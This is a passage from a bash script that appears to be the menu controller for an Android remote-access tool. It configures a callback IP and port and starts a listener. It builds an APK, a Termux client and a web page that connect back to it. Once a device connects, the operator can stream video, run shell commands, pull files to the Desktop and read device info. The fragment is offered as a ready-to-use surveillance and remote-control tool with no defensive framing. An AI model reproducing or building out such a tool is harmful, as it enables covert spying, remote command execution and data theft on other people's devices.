    echo -e "${CYAN}=== STARTING LISTENER ===${NC}\n"
    echo -e "Listening on port: ${GREEN}$LISTENER_PORT${NC}"
    echo -e "Your IP: ${GREEN}$LISTENER_IP${NC}"
    echo -e "Files will be saved to: ${GREEN}$DESKTOP_DIR${NC}"
    echo -e "\n${YELLOW}Commands when device connects:${NC}"
    echo "  stream     - Start video streaming"
    echo "  stop       - Stop streaming"
    echo "  shell <cmd>- Run command"
    echo "  get <file> - Download file to Desktop"
    echo "  ls         - List files"
    echo "  info       - Device info"
    echo "  ping       - Test connection"
    echo "  exit       - Disconnect"
    echo ""
    read -p "Press Enter to start listener (Ctrl+C to stop)..."
    
    cd "$CONFIG_DIR"
    python3 listener.py
}

main_menu() {
    while true; do
        show_header
        
        # Load saved settings
        if [ -f "$CONFIG_DIR/settings.conf" ]; then
            source "$CONFIG_DIR/settings.conf"
            IP_STATUS="${GREEN}$SAVED_IP${NC}"
            PORT_STATUS="${GREEN}$SAVED_PORT${NC}"
        else
            IP_STATUS="${RED}Not set${NC}"
            PORT_STATUS="${RED}Not set${NC}"
        fi
        
        echo -e "Current settings: IP: $IP_STATUS  |  Port: $PORT_STATUS\n"
        
        echo -e "${WHITE}╔════════════════════════════════════════╗${NC}"
        echo -e "${WHITE}║           MAIN MENU                    ║${NC}"
        echo -e "${WHITE}╠════════════════════════════════════════╣${NC}"
        echo -e "${WHITE}║${NC}  ${CYAN}1)${NC}  START LISTENER                  ${WHITE}║${NC}"
        echo -e "${WHITE}║${NC}  ${CYAN}2)${NC}  BUILD APK (saves to Desktop)    ${WHITE}║${NC}"
        echo -e "${WHITE}║${NC}  ${CYAN}3)${NC}  CREATE TERMUX CLIENT            ${WHITE}║${NC}"
        echo -e "${WHITE}║${NC}  ${CYAN}4)${NC}  CREATE WEB PAGE                 ${WHITE}║${NC}"
        echo -e "${WHITE}║${NC}  ${CYAN}5)${NC}  CONFIGURE IP & PORT             ${WHITE}║${NC}"
        echo -e "${WHITE}║${NC}  ${CYAN}6)${NC}  SHOW CONNECTION INFO            ${WHITE}║${NC}"
        echo -e "${WHITE}║${NC}  ${RED}7)${NC}  EXIT                            ${WHITE}║${NC}"
        echo -e "${WHITE}╚════════════════════════════════════════╝${NC}"
        echo ""
        read -p "Enter number [1-7]: " choice
        
        case $choice in
            1)
                if [ -f "$CONFIG_DIR/settings.conf" ]; then
                    start_listener
                else
                    echo -e "${RED}Please configure IP and port first (Option 5)${NC}"
                    sleep 2
                fi
                ;;
            2)
                if [ -f "$CONFIG_DIR/settings.conf" ]; then
                    build_full_apk
                    read -p "Press Enter to continue..."
                else
                    echo -e "${RED}Please configure IP and port first (Option 5)${NC}"
                    sleep 2
                fi
                ;;
            3)
                if [ -f "$CONFIG_DIR/settings.conf" ]; then
                    build_termux_client
                    read -p "Press Enter to continue..."
                else
                    echo -e "${RED}Please configure IP and port first (Option 5)${NC}"
                    sleep 2
                fi
                ;;
            4)
                if [ -f "$CONFIG_DIR/settings.conf" ]; then
                    build_webpage
                    read -p "Press Enter to continue..."
                else
                    echo -e "${RED}Please configure IP and port first (Option 5)${NC}"
                    sleep 2
                fi
                ;;
            5) configure_settings ;;
            6)
                show_header
                echo -e "${GREEN}=== CONNECTION INFO ===${NC}\n"
                echo "Your IP: $(hostname -I | awk '{print $1}')"
                echo "Configured IP: $LISTENER_IP"
                echo "Port: $LISTENER_PORT"
                echo "Desktop: $DESKTOP_DIR"
                echo ""
                echo "Files on Desktop:"
                ls -la "$DESKTOP_DIR"/*.apk "$DESKTOP_DIR"/*.py "$DESKTOP_DIR"/*.html 2>/dev/null | sed 's/^/  /'
                echo ""
                read -p "Press Enter..."
                ;;
            7)
                echo -e "\n${GREEN}Goodbye! Files saved to: $DESKTOP_DIR${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option${NC}"
                sleep 2
                ;;
        esac
    done
}

